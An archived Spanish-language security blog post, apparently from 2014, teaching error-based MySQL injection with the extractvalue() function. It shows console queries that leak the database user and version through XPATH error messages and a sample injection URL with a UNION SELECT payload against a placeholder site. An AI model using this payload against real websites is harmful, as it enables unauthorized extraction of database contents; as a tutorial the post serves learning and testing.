@@ -1,0 +1,272 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>MYSQLI EB Con Extractvalue() - Security</title>
+  <meta name="author" content="q3rv0">
+
+  
+  <meta name="description" content="Quien conozca de inyecciones sabe bien que para explotar una mysqli error based es necesario utitlizar las funciones floor() y rand() . Pero hay otra &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/11/23/mysqli-eb-con-extractvalue">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security</a></h1>
+  
+    <h2>Follow the white rabbit&#8230;.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:q3rv0.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">MYSQLI EB Con Extractvalue()</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-23T03:06:05+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>3:06 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Quien conozca de inyecciones sabe bien que para explotar una mysqli error based  es necesario utitlizar las funciones floor() y rand() .</p>
+
+<p><img src="http://i.imgur.com/SjsNAze.png?1"></p>
+
+<!--more-->
+
+
+<p>Pero hay otra manera que se basa en aprovechar otro tipo de error, incluso es mucho mas sencilla de interpretar ademas de ser un vector corto y eficaz.</p>
+
+<p>Leyendo el blog de Dmitry Evteev en una entrada que habia publicado en el 2009 (bastante viejita ya), encontre una forma de explotar un error based de una manera que llamo poderosamente mi atencion.</p>
+
+<p>La funcion extractvalue() sirve para extraer valores de un elemento XML, por ejemplo tenemos la siguiente cadena:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;b&gt;</span>q3rv0<span class="nt">&lt;/b&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Si quieramos extraer la palabra q3rv0 lo realizariamos de la siguiente manera.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;/b&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="o">+------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;/b&#39;</span><span class="p">)</span> <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="n">q3rv0</span>                              <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------+</span>
+</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>La manera de aprovechar esta funcion para que nos devuelva informacion es obligarla a realizar un error de sintaxis.</p>
+
+<p>Que pasa si introducimos la funcion user() en el argumento que es utilizado para extraer ciertos valores.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="nf">user</span><span class="p">());</span>
+</span><span class='line'><span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;@localhost&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Como vemos nos arroja el error, ademas del usuarios en la db.</p>
+
+<p>El problema es que lo muestra entrecortado, para eso vamos a concatenar la salida.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;q3rv0&lt;/b&gt;&#39;</span><span class="p">,</span> <span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span> <span class="nf">user</span><span class="p">()));</span>
+</span><span class='line'><span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;~root@localhost&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Como podemos llevarla acabo mediante una inyeccion?</p>
+
+<p>De la siguiente manera.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://www.webvuln.com/negocio.php?id=60 union select extractvalue(1, concat(0x7e, version()))–</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/4eEgNDG.png?1"></p>
+
+<p>Referencia: <a href="http://devteev.blogspot.com.ar">http://devteev.blogspot.com.ar</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-11-23T03:06:05+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>3:06 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/11/23/mysqli-eb-con-extractvalue/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/11/23/mysqli-eb-con-extractvalue/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/" title="Previous Post: LFI+SQLI [Incluyendo ficheros a travez de valores enteros]">&laquo; LFI+SQLI [Incluyendo ficheros a travez de valores enteros]</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/" title="Next Post: Escribiendo un auxiliar para MSF">Escribiendo un auxiliar para MSF &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/">Desbordando El Buffer en Linux X86 (I)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/">Tomando El Control De Una Camara AXIS – Parte I</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/">Escribiendo Un Auxiliar Para MSF</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/mysqli-eb-con-extractvalue/">MYSQLI EB Con Extractvalue()</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/">LFI+SQLI [Incluyendo Ficheros a Travez De Valores Enteros]</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - q3rv0 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
